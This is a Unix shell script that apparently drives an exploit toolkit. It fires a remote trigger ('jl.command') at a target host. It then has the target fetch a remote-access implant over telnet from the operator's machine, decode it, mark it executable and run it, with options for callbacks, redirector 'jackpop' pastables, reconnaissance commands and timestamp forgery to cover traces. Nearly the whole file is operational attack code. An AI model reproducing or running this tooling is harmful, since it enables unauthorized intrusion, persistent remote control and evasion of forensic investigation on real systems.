#!/bin/sh
COLOR_SUCCESS="\\033[1;32m"
COLOR_FAILURE="\\033[1;31m"
COLOR_WARNING="\\033[1;33m"
COLOR_NORMAL="\\033[0;39m"
COLOR_NOTE="\\033[0;34m"
SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
SETCOLOR_WARNING="echo -en $COLOR_WARNING"
SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
SETCOLOR_NOTE="echo -en $COLOR_NOTE"
SYNTAX="<rem_ip> <loc_ip> <localport> <targetdir> \\
       <rat_file> [<jl_port> [<rat_port> [nosy] ] ]"
DEFJLPORT=13
PROG=`basename ${0}`
VER=2.2
usage () {
    $SETCOLOR_NOTE
    echo "
Usage: 
    [TA=target-address       TP=target-port     \\
    RA=redirector-address    RP=redirector-port] \\
    [C=IP:nopen-callback-port] \\
    $PROG [ options ] \\
    [-D \"remote end environment variable(s)\"] \\
       $SYNTAX
OR
    [TA=target-address       TP=target-port     \\
    RA=redirector-address    RP=redirector-port] \\
    $PROG [-1 | -2 | -3] <rem_ip> [<jl_port>]

OPTIONS
 -i     have IN bless us
 -z     expects uudecode only with NO COMPRESSION
 -q     disables \"confirm syntax\" prompt

 *  RA and RP required if redirecting JL with jackpop
 *  if RA/RP are provided without TA/TP you are prompted for TA/TP
 *  jl is assumed to be in ./jl
 *  jl_port defaults to $DEFJLPORT (arg required if rat_port is used)
 *  rat_port optional - default used if not given. BUT--if rat_port is
      given and nopen is not being used, the final argument must be
      nosy to send the older syntax up.
 *  C=IP:port is used as the nopen callback IP and port. C=IP:port
      overrides rat_port argument, and -D argument below overrides C=port.
 *  -D argument is used to set environment vars at the far end before
      execution. E.g.: -D 'D=\"-c loc_ip port\"'.
      NOTE: If -D is used, the rat_port parameter and C=IP:port are ignored.
 *  -1 executes \"w ; ls -alR /tmp ; df -k\" instead of the usual
 *  -2 executes \"w ; netstat -an | egrep '(LISTEN|SYN_SENT)'\"
 *  -3 executes \"w ; which mkdir telnet cat uudecode uncompress chmod ls netstat egrep $RAT_FILE\"

   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd
   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd 25 17348
   e.g. $PROG alice LOCALIP 32177 /tmp/.X11R6 nscd 113 33433 nosy

NOTE: You may now pre-set any/all of the following environment
      variables if using jackpop with $PROG (RA & RP required).

For jl.command
locally:            RA=redirector-address   RP=redirector-port

For jackpop on      LP=same-as-RP           SA=your-source-IP
redirector:         TA=target-address       TP=target-JL-port

   If you do not set LP and/or SA, they will be determined by the
   <jl_port> parameter and ifconfig. 

   If you do not set TA and/or TP, you will be prompted for them.

$PROG version $VER
"
    $SETCOLOR_NORMAL
    exit
}

echo "CommandLine: $PROG ${*}"

# this is default but may get shut off with -z arg
UNCOMPRESS="yes"


while [ "`echo \"$1\" | grep -- -`" ] ; do
    NUM=`echo "$1" | cut -c 2`
    case "$NUM" in
    1)
	DOCMD="
w ; ls -alR /tmp ; df -k"
	;;
    2)
	DOCMD="
w ; netstat -an | egrep \"(LISTEN|SYN_SENT)\""
	;;
    3)
	DOCMD="
w ; which mkdir telnet cat uudecode uncompress chmod ls netstat egrep"
	;;
    i) 
        INBLESS="SU= HIDEME= HIDECON= "
        ;;
    a)
	AUTOCMD=1
	echo "The \"-a\" feature is disabled"
	exit
	;;
    z)
	UNCOMPRESS=""
	;;
    q)
	QUIET=1
	;;
    D)
	shift
	E="$1"
	;;
    [hH])
	usage
	;;
    [vV])
	echo "$PROG version $VER"
	exit
	;;
    *)
	echo "Unrecognized argument $1"
	exit 1
	;;
    esac
    shift
done

[ "$DOCMD" ] && SHORTARGS=1

if [ $SHORTARGS ] ; then 
    if [ ${#} != 1 ] && [ ${#} != 2 ] ; then
	usage
    fi
    JLPORT=$2
else
    case "${#}" in
	0|1|2|3|4|9)
	usage
	;;
    esac
fi

REMOTEIP=$1
LOCALIP=$2
LOCALPORT=$3
TARGETDIR=$4
RAT_FILE=$5
[ "$JLPORT" ] || JLPORT=$6
RAT_PORT=$7
RAT_NAME=$8
[ "$UNCOMPRESS" ] && UNCOMPRESS="
uncompress -f $RAT_FILE.Z"

[ "$RAT_NAME" ] || RAT_NAME=nopen

PLATFORM=`uname`
if [ "$PLATFORM" = "Linux" ]; then
  MINUSN=-n
else
  MINUSN=""
fi
# need this always now...
MINUSN=""

[ "$JLPORT" ] || JLPORT=$DEFJLPORT

if [ "$RAT_PORT" != "" ]; then 
  if [ $RAT_PORT -lt 1025 -o $RAT_PORT -gt 65535 ]; then
    echo rat_port must be between 1025 and 65535, inclusive
    echo ""
    usage
  fi
  if [ "$RAT_NAME" = "nosy" ]; then
    RAT_ARG="P=$RAT_PORT "
  else
    if [ "$RAT_NAME" = "nopen" ]; then
        RAT_ARG="D=\"-l $RAT_PORT\" "
	DIDTHIS="# -jackpopped to $REMOTEIP\n-nstun $REMOTEIP $RAT_PORT\n"
    else
	echo rat_name $RAT_NAME is not nosy or nopen
	echo ""
	usage
    fi
  fi
else
  RAT_ARG=""
fi
# If we have $C, RAT_ARG just defined is thrown away.
if [ "$C" != "" ] ; then
  CALLBACKIP=`echo $C | cut -d ":" -f 1`
  CALLBACKPORT=`echo $C | cut -d ":" -f 2`
  RAT_ARG="D=\"-c $CALLBACKIP $CALLBACKPORT\" "
  DIDTHIS="# -jackpopped to $TA callback to $CALLBACKIP:$CALLBACKPORT--callback\n-call $CALLBACKIP $CALLBACKPORT\n\n-nrtun $CALLBACKPORT\n"
fi
# If we have $E, it came from -D argument, and any RAT_ARG
# just defined is thrown away.
# This allows for changes in nopen syntax.
if [ "$E" != "" ] ; then
  RAT_ARG="$E "
  DIDTHIS=
fi

JACKPOP=0
# are we jackpopping?
if [ ! "$RA" = "" ] || [ ! "$RP" = "" ] ; then
    JACKPOP=1
    if [ "$RA" = "" ] || [ "$RP" = "" ] ; then
	echo "FATAL ERROR: Must have BOTH environment variables RA and RP set."
	exit 1
    fi
    # If NOPENJACK is set, -jackpop was used so don't bother with these.
    if [ ! "$NOPENJACK" ] ; then 
	if [ ! "$RP" = "$JLPORT" ] ; then
	    echo "Shouldn't RP=JLPORT? 
(you have RP=$RP and JLPORT=$JLPORT)"
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
	if [ ! "$RA" = "$REMOTEIP" ] || [ ! "$RA" = "$LOCALIP" ] ; then
	    echo "Shouldn't RA=LOCALIP=REMOTEIP? (you have
   RA=$RA, LOCALIP=$LOCALIP
   and REMOTEIP=$REMOTEIP)"
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
    fi
    if [ ! "$TA" ] ; then
	DEFTARGETIP=`egrep "^Target IP:" /current/etc/opscript.txt | awk '{print $3}' | head -1`
	echo $MINUSN "
Enter the IP of your actual target you are redirecting
through $REMOTEIP to get to (this is used here to echo
a jackpop command to paste into your redirector): [$DEFTARGETIP]"
	read TA
	[ "$TA" ] || TA=$DEFTARGETIP
    fi
    if [ ! "$TP" ] ; then
	echo $MINUSN "
Enter the actual target's JL trigger port (this is used here
to echo a jackpop command to paste into your redirector): [$JLPORT] "
	read TP
	[ "$TP" ] || TP=$JLPORT
    fi
    if [ ! "$LP" ] ; then
	LP=$RP
    fi

    if [ "$SA" ] ; then
	if [ ! "$NOPENJACK" ] && [ ! "`ifconfig | grep $SA`" ] ; then
	    echo "Shouldn't SA=one of your IPs?
(you have SA=$SA)."
	    echo $MINUSN "
Hit ^C to abort and fix this or hit enter to continue
(though that would most likely not work)."
	    read quitans
	fi
    else
	LOCAL_IP_GUESS=`ifconfig ppp0 2>/dev/null | grep inet | grep -v grep | grep -v ":127\." | awk '{print $2}' | cut -d ":" -f 2`
	# if that fails maybe it's on eth0
	[ "$LOCAL_IP_GUESS" ] || LOCAL_IP_GUESS=`ifconfig -a eth0 | grep inet | grep -v grep | awk '{print $2}' | cut -d ":" -f 2`
	[ "$LOCAL_IP_GUESS" ] || echo "Unable to get local IP address..bailing" 
	[ "$LOCAL_IP_GUESS" ] || exit 1
	SA=$LOCAL_IP_GUESS
    fi
fi

BASEDIR=`dirname "$TARGETDIR"`

BASEDIR2=`basename "$BASEDIR"`
 
# at this point DOCMD="" if we're doing usual mkdir/cd/etc, otherwise not
if [ ! "$DOCMD" ] && [ "$BASEDIR2" != "tmp" ] ; then
    TOUCHSTUFF="
touch -r $BASEDIR /tmp/.advt$$"
fi

if [ "$DOCMD" = "" ] ; then
  if [ "$AUTOCMD" ] ; then 


     DOCMD=`packrat -a $LOCALPORT -E "${RAT_ARG}" -e -q -c -d $TARGETDIR -i $LOCALIP $RAT_FILE`
     xterm -hold -e sh -c "packrat -a $LOCALPORT -E \"${RAT_ARG}\" -e -q -c -d $TARGETDIR -i $LOCALIP $RAT_FILE" &
     sleep 5
  else
    DOCMD="
mkdir -p $TARGETDIR
cd $TARGETDIR || cd /tmp
telnet $LOCALIP $LOCALPORT | cat > $RAT_FILE.uu
uudecode $RAT_FILE.uu $UNCOMPRESS
chmod 777 $RAT_FILE
PATH=$TARGETDIR ${RAT_ARG}${RAT_FILE}"

  fi
fi
REALCMD="PATH=$TARGETDIR:/tmp:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd $TOUCHSTUFF  ; sleep 3 ; $DOCMD
exit 0"

echo ""
echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
echo ""
echo "Running these commands on target:"
$SETCOLOR_NOTE
echo "REALCMD=\"$REALCMD\""
$SETCOLOR_NORMAL
echo ""

if [ "$JACKPOP" = 1 ] && [ ! "$NOPENJACK" ] ; then
    echo "
Using jackpop with environment variables as follows: 
  Redirector Address	RA=$RA
  Redirector Port	RP=$RP	
  Target Address	TA=$TA
  Target Port		TP=$TP
  Listening Port on RA	LP=$LP	
  Source Address	SA=$SA	

Now, some pastables. First, the jackpop command you need to run in an
INCISION window on $RA, then the -rtun command in a NOPEN window
on the same box, and finally an rm command to wipe jackpop: "
$SETCOLOR_NOTE
    echo "
 chmod 700 jp&&netstat -an|grep $LP||PATH=. SA=$SA TA=$TA TP=$TP LP=$LP jp

 rm jp ; ls -al ; ls -al jp

 -rtun $LOCALPORT
"
    $SETCOLOR_NORMAL
fi
if [ "$TOUCHSTUFF" ] ; then 
    $SETCOLOR_WARNING
    echo "
Location for working directory $TARGETDIR is not tmp.
Will do \"touch -r $BASEDIR /tmp/.advt$$\". Do not forget to use
and then rm it when you BAIL.
"
    $SETCOLOR_NORMAL
fi
echo "Command about to be executed:"
echo " ${INBLESS}jl.command telnet $REMOTEIP $JLPORT"

if [ ! "$NOPENJACK" ] ; then 
  $SETCOLOR_FAILURE
  echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
  $SETCOLOR_NORMAL
  [ "$QUIET" ] || echo $MINUSN "hit enter to proceed, ^C to not: "
  [ "$QUIET" ] || read junk
fi

#export these so jl.command sees them
export REALCMD
[ "$INBLESS" ] && export INBLESS

if [ "$DIDTHIS" ] ; then
    echo -e "$DIDTHIS" >> /current/down/didthis
fi

#now run jackladder

jl.command telnet $REMOTEIP $JLPORT
